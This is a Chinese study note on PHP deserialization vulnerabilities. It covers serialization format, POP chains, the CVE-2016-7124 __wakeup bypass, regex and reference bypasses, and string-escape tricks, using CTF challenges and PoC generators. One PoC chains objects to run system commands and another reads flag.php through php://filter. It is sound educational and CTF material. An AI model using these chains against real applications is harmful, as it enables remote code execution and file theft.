---
created: 2023-12-19T11:30
updated: 2024-03-06T20:23
---




#### 反序列化
序列化和反序列化原理作用：

序列化：是指将数据结构例如数组，对象什么的，转换为一串字符流的过程可以使其在传输和缓存中持久化

反序列化：就是将一串序列化的字符流解码成对象或者数据结构，而这种还原的过程叫做反序列化

php中序列化的函数是 serialize()  反序列化就是 unserialize()

反序列化也叫对象注入
[《php反序列化漏洞教程》从零到精通2023超详细版 (完整版）_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1TH4y1U7tJ/)
#### **序列化和反序列化漏洞**

序列化是指将数据结构例如数组，对象什么的，转换为一串字符流的过程可以使其在传输和缓存中持久化

反序列化就是将一串序列化的字符流解码成对象或者数据结构，而这种还原的过程叫做反序列化

php中序列化的函数是 serialize() 反序列化就是 unserialize()

最前面的的代表，O是对象类型

![截图.png](   Web/media/image12.png)

**对象类型的序列化和反序列化**

![截图.png](   Web/media/image13.png)


private属性序列化属性名称格式是0x00类名0x00成员名
protected 属性序列化属性名称格式是0x00%2A0x00成员名就是*
![[Pasted image 20240124092805.png]]
var_dump()更加详细

原理实践

```
\<?php

class people{

public \$name;

public \$age;

}

\$shan=new people(); #对这个people这个类进行实体化等于shan

\$shan-\>name=\'shan\';

\$shan-\>age=17;

\$a=serialize(\$shan);

echo \$a;

?>
```

![截图.png](   Web/media/image14.png)


O:6:"people":2:{s:4:"name";s:4:"shan";s:3:"age";i:17;}

O:类名长度:"类名":变量数目:{变量的类型:变量名的长度:"变量的名字";变量值的类型:变量值的长度:"变量的值";}

不同的属性序列化也不一样比如，private,protected

Pubic 公有

Private 私有

Protect 保护

private $age=18; %00people%00age #people是类名

protected %height='156cm'; %00%2A%00height #%2A是*

![截图.png](   Web/media/image15.png)


对象类型反序列化

如图上面这个是用var_dump,下面使用print_r

![截图.png](   Web/media/image16.png)


反序列化查看只能用var_dump和print_r

反序列化是不会看你之前的类而是看你要反序列化的数据的内容，就是说你可以在中途改掉之前序列化的内容而反序列化后的值会和你之前改掉的值一样而不是和原来还没序列化的值一样，如图：

![截图.png](   Web/media/image17.png)


初识反序列化漏洞

![截图.png](   Web/media/image18.png)


修改一下里面的值满足就直接是admin

**__invoke()魔术方法 ： 将对象当作函数来使用时执行此方法**


**数组类型序列化**

![截图.png](   Web/media/image20.png)


a:2:{i:0;s:4:"shan";i:1;s:2:"ji";}

a:数组中有效值的数量:{角标数字类型:0号角标;数值类型:数值长度:"数值内容";}

关联数组序列化

这个有点像Ｃ语言中的字典有键和值

![截图.png](   Web/media/image21.png)

反序列化漏洞例题：
###### [极客大挑战 2019]PHP


#### pop链
pop链就是利用了php中对象的自动调用魔术方法的特性，将多个类和方法联系起来，形成链式调用。当php反序列化执行，会自动调用这些方法，触发代码执行。
###### pop链构造技巧
1. 找可能出现漏洞点
2. 根据漏洞点反推，看逻辑是否可行
3. 最后构造poc验证
![[Pasted image 20240125092835.png]]
###### 细节：
unserialize()反序列化是不会触发`__construct`魔术方法的。因为这个是要实例化才被触发，而`__destruct`魔术方法会被反序列化结束执行。



###### 例题：
[[MoeCTF 2021]unserialize | NSSCTF](https://www.nssctf.cn/problem/3398)
```php
<?php  
  
class entrance  
{  
    public $start;  
  
    function __construct($start)  
    {  
        $this->start = $start;  
    }  
  
    function __destruct()  
    {  
        $this->start->helloworld();                     //3,$start=new springboard()  
    }  
}  
  
class springboard  
{  
    public $middle;  
  
    function __call($name, $arguments)  
    {  
        echo $this->middle->hs;                //2,$middle=new evil()  
    }  
}  
  
class evil  
{  
    public $end;  
  
    function __construct($end)  
    {  
        $this->end = $end;  
    }  
  
    function __get($Attribute)  
    {  
        eval($this->end);                           //1,$end=system("ls");  
    }  
}  
  
if(isset($_GET['serialize'])) {  
    unserialize($_GET['serialize']);  
} else {  
    highlight_file(__FILE__);  
}  
//3,$start=new springboard()  
//1,$end=system("ls");  
//2,$middle=new evil()
```
poc
```php
<?php  
  
class entrance  
{  
    public $start;  
  
    function __construct()  
    {  
        $this->start = new springboard();  
    }  
}  
  
class springboard  
{  
    public $middle;  
}  
  
class evil  
{  
    public $end='system("cat% /flag");';  
}  
$a=new entrance();  
$a->start->middle=new evil();  
echo serialize($a);  
?>
```
拿到flag
![[Pasted image 20240125162710.png]]
![[Pasted image 20240125094955.png]]
`__construct`可以赋值类。使用urlencode()是因为private会有空字符，并且我们要以get方式传值
![[Pasted image 20240125095649.png]]
[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[MRCTF2020]Ezpop)
```php
Welcome to index.php  
<?php  
//flag is in flag.php  
//WTF IS THIS?  
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95  
//And Crack It!  
class Modifier {  
    protected  $var;  
    public function append($value){  
        include($value);  
    }  
    public function __invoke(){                                         //把对象当作函数执行就被触发  
        $this->append($this->var);                                      //1,$var="flag.php"  
    }  
}  
  
class Show{  
    public $source;  
    public $str;  
    public function __construct($file='index.php'){  
        $this->source = $file;  
        echo 'Welcome to '.$this->source."<br>";  
    }  
    public function __toString(){                                    //对象被当作字符串执行触发  
        return $this->str->source;                                  //3,$str=new Test()  
    }  
  
    public function __wakeup(){                                                                //反序列化触发  
        if(preg_match("/gopher|http|file|ftp|https|dict|../i", $this->source)) {    //4,$source=new show()  
            echo "hacker";  
            $this->source = "index.php";  
        }  
    }  
}  
  
class Test{  
    public $p;  
    public function __construct(){  
        $this->p = array();  
    }  
  
    public function __get($key){                                //当对象中不存在或不可访问的属性被访问就触发  
        $function = $this->p;                                   //2,$p=new Modifier()  
        return $function();  
    }  
}  
  
if(isset($_GET['pop'])){  
    @unserialize($_GET['pop']);  
}  
else{  
    $a=new Show;  
    highlight_file(__FILE__);  
}
```
poc,伪协议读取
```php 
<?php  
class Modifier {  
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";  
}  
class Show{  
    public $source;  
    public $str;  
    function __construct(){  
        $this->str=new Test();  
    }  
  
}  
class Test{  
    public $p;  
}  
$a=new show();  
$a->source=new show();  
$a->source->str->p=new Modifier();  
echo urlencode(serialize($a));
```
得到flag
![[Pasted image 20240125110818.png]]
##### 绕过操作
###### 输出类的原有属性
![[Pasted image 20240125145532.png]]
当序列化不包含原有属性且==语法正确情况下，反序列化输出类中其他属性。==
![[Pasted image 20240126093412.png]]
![[Pasted image 20240126093421.png]]

###### 序列化重复属性覆盖
同属性值，序列化属性可以覆盖
![[Pasted image 20240126093833.png]]
传递两个一样的name值，而后面这个会覆盖掉前面的name值
![[Pasted image 20240126093856.png]]




###### **CVE-2016-7124 WAKEUP方法**
==当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 `__wakeup` 函数的执⾏==
影响版本：PHP5<5.6.25:PHP7<7.0.10
例题：[[SWPUCTF 2022 新生赛]ez_ez_unserialize | NSSCTF](https://www.nssctf.cn/problem/3082)
如果存在__wakeup方法，调用 unserilize()
方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于
真实的属性个数时会跳过__wakeup的执行

我们只需要把对象原来属性值比原来的大就行我们把1改成2

修改前:O:6:"sercet":1:{s:12:"%00sercet%00file";s:8:"flag.php";}

修改后:O:6:"sercet":2:{s:12:"%00sercet%00file";s:8:"flag.php";}

![截图.png](   Web/media/image19.png)
###### `__destruct`强制触发
```php
<?php  
class test{  
    public $i;  
    function __construct($i){  
        $this->i=$i;  
    }  
    function __destruct(){  
        echo $this->i ."销毁\n`";  
    }  
}  
new test('1');//对象会直接销毁  
  
$a=new test('2');  
$a=1;//给一个对象变量重新赋值之前的对象就会直接销毁  
  
$a=new test('3');  
unset ($a); //使用unset也可以手动删除对象从而触发  
  
//正常实例对象会在脚本运行结束自动销毁  
$a=new test('4');  
echo "---结束---n"  
  
?>

```
![[Pasted image 20240126103848.png]]
正常实例化对象脚本运行完成就销毁，所以4在最后面

绕过这个，使用上面第二个方法，鸠占鹊巢，自动销毁对象从而强制触发`__destruct`
![[Pasted image 20240126110908.png]]
```php
<?php  
class test{  
    public $a=1;  
}  
$a=new test();  
$test[0]=serialize($a);  
$test[1]="N";  
echo serialize($test); //a:2:{i:0;s:27:"O:4:"test":1:{s:1:"a";i:1;}";i:1;i:1;}  
//改成a:2:{i:0;s:27:"O:4:"test":1:{s:1:"a";i:1;}";i:0;i:1;}绕过  
?>
```
一直没复现成功。就是把类反序列化后存到数组中的下标为0，然后在给数组1写入内容，最后序列化，然后改一下
序列化后的数组1的下标改为下标0;
###### 绕过特定正则`('/^O:\d+/')`
如`preg_match('/^O:\d+/')`匹配序列化字符串是否对象字符串开头。
绕过方法：
1. 利用加号绕过（url传参是%2B）==高版本失效==
O:+6:"sercet":1:{s:12:"%00sercet%00file";s:8:"flag.php";}
3. 利用数组对象绕过serialize(array($a)); ==高版本也能行，这个是转空子==
a:1:{i:0;O:4:"test":1:{s:1:"a";i:1;}}
###### 引用绕过强比较
![[Pasted image 20240126114224.png]]
直接赋值b是不可以的。
==将`$a的地址引用给$b`就可以实现绕过了==
poc
```php
<?php  
show_source(__FILE__);  
class test  
{  
    public $a;  
    public $b;  
}  
$a=new test();  
$a->b=&$a->a;  
echo serialize($a);  
?>
```
![[Pasted image 20240126114151.png]]
例题：![[Pasted image 20240128150030.png]]
###### 十六进制绕过简单字符过滤
![[Pasted image 20240126152711.png]]
##### 字符串逃逸
###### 反序列化语法
PHP在反序列化时，语法是==以;做为字段的分隔==，==以}作为结尾==并且是==根据长度判断内容==其中==字符串要用双引号包裹==而不是单引号包裹或者不包裹。
==在结束符}==之后的任何内容==不会影响==反序列化的结果![[Pasted image 20240126150246.png]]
==根据长度判断内容所以用双引号当内容也不会报错==，但是不能用单引号包裹![[Pasted image 20240126150352.png]]
php反序列化字符逃逸就是通过这个结尾符号实现当长度不对应的时候出现报错
###### 什么是字符串逃逸
就是开发者使用先将对象进行序列化，然后将序列化后的敏感字符进行过滤或替换，最后进行反序列化。这时候就可以产生php反序列化字符串逃逸漏洞。
==例如字符串减少：==
我们传输内容为：O:4:"test":1:{s:4:"name";s:5:"admin";}
经过对序列化后的敏感字符过滤或替换变成
O:4:"test":1:{s:4:"name";s:5:"==hack"==;}
这里因为是按照长度来计算的所以hack"就被当做了内容，而没有双引号闭合，造成反序列化失败保证安全性
==例如字符串增多：==
我们传输内容为：O:4:"test":1:{s:4:"name";s:5:"admin";}
经过对序列化后的敏感字符过滤或替换变成
O:4:"test":1:{s:4:"name";s:5:"==hacke==r";}
这里因为是按照长度来计算的所以hacker就被当做了内容，而多出内容并且没闭合，造成反序列化失败保证安全性

使用字符串逃逸就可以对上面的限制进行绕过
###### 逃逸吞噬单字符：
```php 
//任务添加一个属性age=25;
<?php  
class a{  
    public $name="abcp";  
    public $number='1232';  
}  
$data=serialize(new a());  
echo $data."\n";  
$data=str_replace("p","",$data);  
echo $data."\n";  
var_dump(unserialize($data));  
?>
```
这个str_replace是能字符串逃逸的罪魁祸首。

```php
<?php  
class a{  
    public $name="abcp";  
    public $number='1232';  
}  
$data=serialize(new a());  
echo $data."\n"; //O:1:"a":2:{s:4:"name";s:4:"abcp";s:6:"number";s:4:"1232";}  
$data=str_replace("p","",$data);  
echo $data."\n";//O:1:"a":2:{s:4:"name";s:4:"abc";s:6:"number";s:4:"1232";}  
var_dump(unserialize($data));  
?>
```
黄色的就是要被吞噬的：O:1:"a":2:{s:4:"name";s:4:"==abc";s:6:"number";s:4:=="1232";}
而后面的1232是可控信息，黄色部分就当做name的值。
```php
<?php  
class a{  
    public $name="abcpppppppppppppppppppp";//多写一个p吞噬掉number的长度比之前的个位多了一个十位  
    public $number=';s:3:"age";i:25;}';//用这个}结束后面的内容都不会影响到反序列化的内容  
}  
$data=serialize(new a());  
echo $data."\n"; //O:1:"a":2:{s:4:"name";s:4:"abcp";s:6:"number";s:4:"1232";}  
$data=str_replace("p","",$data);  
echo $data."\n";//O:1:"a":2:{s:4:"name";s:4:"abc";s:6:"number";s:4:"1232";}  
echo strlen('";s:6:"number";s:4:'); //算出要吞噬的长度为19,然后在name的值里用p填补19个长度。  
//直接反序列化这个是没问题的O:1:"a":2:{s:4:"name";s:22:"abc";s:6:"number";s:4:";s:3:"age";i:25;}";}  
var_dump(unserialize($data));  
?>
```
![[Pasted image 20240127084931.png]]
![[Pasted image 20240126201054.png]]
###### 字符串逃逸减少吞噬多个字符
```php
<?php  
class a{  
    public $name="abcphp";  
    public $number='123';  
}  
$data=serialize(new a());  
echo $data."\n";  
$data=str_replace("php","",$data);  
  
?>
```
而我们字符串是20个不能整除3，那么我们就多吞,当然也可以吞到一部分number的值，没问题反正用双引号包裹就可以了。
O:1:"a":2:{s:4:"name";s:4:"==abc";s:6:"number";s:4:"==1232";}
```php
<?php  
class a{  
    public $name="abcphpphpphpphpphpphpphp";//多写一个p吞噬掉number的长度比之前的个位多了一个十位  
    public $number='";s:3:"age";i:25;}';//因为是多吞噬的所以要在前面加双引号，用这个}结束后面的内容都不会影响到反序列化的内容  
}  
$data=serialize(new a());  
echo $data."\n";  
$data=str_replace("php","",$data);  
echo $data."\n";  
echo strlen('";s:6:"number";s:4:'); //算出要吞噬的长度为21,然后在name的值里用php填补21个长度。  
//直接反序列化这个是没问题的O:1:"a":2:{s:4:"name";s:22:"abc";s:6:"number";s:4:";s:3:"age";i:25;}";}  
var_dump(unserialize($data));  
?>
```
![[Pasted image 20240127085855.png]]
所以就算你一次性吞100个也是有办法的
- [ ] 要点：第一个字符串的构造，需要判断吞噬多少个字符，是否需要在两个引号之间（就是可控值）添加字符，第二个字符串只需要构造的满足最后的语法规范即可
###### 逃逸吐出单字符
例题：这个k就是吐出来的字符
O:1:"a":2:{s:4:"name";s:7:"abcphp"";s:6:"number";s:18:"";s:3:"age";i:25;}";}
O:1:"a":2:{s:4:"name";s:7:"abchea==k=="";s:6:"number";s:18:"";s:3:"age";i:25;}";}

```php
<?php  
class a{  
    public $name='abcphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:3:"age";i:25;}';  
    public $number='1234';  
}  
$data=serialize(new a());  
echo $data."\n"; //  
$data=str_replace("php","heak",$data);  
echo $data."\n"; //  
var_dump(unserialize($data));  
?>
```
就是先计算出要写的内容长度然后，多填几个吐出来，然后用"闭合，后面就可以写内容了，逃逸了。
![[Pasted image 20240127171232.png]]
![[Pasted image 20240127170538.png]]
写多个属性就要注意别出错
这里是";s:6:"number";s:4:"1234";s:3:"age";i:25;} 42个字符,所以要写42个php
```php
<?php  
  
class a{  
    public $name='phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:6:"number";s:4:"1235";s:3:"age";i:15;}';  
    public $number='1234';  
    public $age=25;  
}  
$data=serialize(new a());  
echo $data."\n"; //  
$data=str_replace("php","heak",$data);  
echo $data."\n"; //  
var_dump(unserialize($data)); 

?>
```
![[Pasted image 20240127182204.png]]
必须要有这个属性才能改写其他属性内容。
###### 字符串逃逸吐出多个字符
一个吐出三个或者其他的
```php
<?php  
  
class a{  
    public $name='shan';  
    public $number='1234';  
}  
$data=serialize(new a());  
echo $data."\n"; //  
$data=str_replace("php","heaker",$data);  
echo $data."\n"; //  
var_dump(unserialize($data));  
?>
```